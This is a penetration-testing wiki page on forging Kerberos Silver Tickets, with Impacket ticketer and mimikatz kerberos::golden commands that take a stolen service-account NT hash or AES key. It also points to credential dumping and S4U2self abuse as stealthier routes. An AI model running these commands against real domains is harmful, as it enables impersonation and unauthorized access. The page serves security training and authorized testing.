# Silver tickets

## Theory

The long-term key of a service account can be used to forge a Service ticket that can later be used with [Pass-the-ticket](../ptt.md) to access that service. In a Silver Ticket scenario, an attacker will forge a Service Ticket containing a PAC that features arbitrary information about the requesting user, effectively granting lots of access.

## Practice

> [!IMPORTANT]
> When forging tickets, before November 2021 updates, the `user-id` and `groups-ids` were useful but the `username` supplied was mostly useless. As of Nov. 2021 updates, if the `username` supplied doesn't exist in Active Directory, the ticket gets rejected. This also applies to Silver Tickets.

In order to craft a silver ticket, testers need to find the target service account's RC4 key (i.e. NT hash) or AES key (128 or 256 bits). This can be done by [capturing an NTLM response](../../ntlm/capture.md) (preferably NTLMv1) and [cracking](../../credentials/cracking.md) it, by [dumping LSA secrets](../../credentials/dumping/sam-and-lsa-secrets.md), by doing a [DCSync](../../credentials/dumping/dcsync.md), etc.

_"While the scope is more limited than Golden Tickets, the required hash is easier to get and there is no communication with a DC when using them, so detection is more difficult than Golden Tickets." (_[_adsecurity.org_](https://adsecurity.org/?p=2011)_)_

=== UNIX-like

The [Impacket](https://github.com/SecureAuthCorp/impacket) script [ticketer](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) can create silver tickets.

```bash
# Find the domain SID
lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0

# with an NT hash
python ticketer.py -nthash "$NT_HASH" -domain-sid "$DomainSID" -domain "$DOMAIN" -spn "$SPN" "username"

# with an AES (128 or 256 bits) key
python ticketer.py -aesKey "$AESkey" -domain-sid "$DomainSID" -domain "$DOMAIN" -spn "$SPN" "username"
```

The SPN (ServicePrincipalName) set will have an impact on what services will be reachable. For instance, `cifs/target.domain` or `host/target.domain` will allow most remote dumping operations (more info on [adsecurity.org](https://adsecurity.org/?page_id=183)).


=== Windows

On Windows, [mimikatz](https://github.com/gentilkiwi/mimikatz) can be used to generate a silver ticket with [`kerberos::golden`](https://tools.thehacker.recipes/mimikatz/modules/kerberos/golden). Testers need to carefully choose the right SPN type (cifs, http, ldap, host, rpcss) depending on the wanted usage.

```bash
# with an NT hash
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$serviceAccount_NThash /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt

# with an AES 128 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$serviceAccount_aes128_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt

# with an AES 256 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$serviceAccount_aes256_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt
```

For both mimikatz and Rubeus, the `/ptt` flag is used to automatically [inject the ticket](../ptt.md#injecting-the-ticket).

> [!SUCCESS]
> A great, stealthier, alternative to silver ticket is to [abuse S4U2self](../delegations/s4u2self-abuse.md) in order to impersonate a domain user with local admin privileges on the target machine by relying on Kerberos delegation instead of forging everything.
